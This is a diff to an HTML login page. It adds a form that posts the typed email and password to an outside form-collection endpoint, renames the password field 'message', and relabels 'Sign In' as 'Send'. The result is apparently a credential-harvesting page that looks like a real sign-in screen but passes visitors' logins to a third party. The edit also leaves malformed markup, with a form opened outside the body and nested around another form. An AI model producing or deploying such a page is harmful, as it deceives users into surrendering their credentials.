@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-
+   
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -9,7 +9,10 @@
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@48,600,0,0" />
     <title>Login Page</title>
 </head>
-
+<form
+  action="https://formspree.io/f/xqkorjey"
+  method="POST"
+>
 <body>
 
     <div class="login-card-container">
@@ -24,12 +27,12 @@
             <form class="login-card-form">
                 <div class="form-item">
                     <span class="form-item-icon material-symbols-rounded">mail</span>
-                    <input type="text" placeholder="Enter Email" id="emailForm" 
+                    <input type="email" placeholder="Enter Email" name="email" 
                     autofocus required>
                 </div>
                 <div class="form-item">
                     <span class="form-item-icon material-symbols-rounded">lock</span>
-                    <input type="password" placeholder="Enter Password" id="passwordForm"
+                    <input type="password" placeholder="Enter Password" name="message"
                      required>
                 </div>
                 <div class="form-item-other">
@@ -39,7 +42,7 @@
                     </div>
                     <a href="#">I forgot my password!</a>
                 </div>
-                <button type="submit">Sign In</button>
+                <button type="submit">Send</button>
             </form>
             <div class="login-card-footer">
                 Don't have an account? <a href="#">Create a free account.</a>
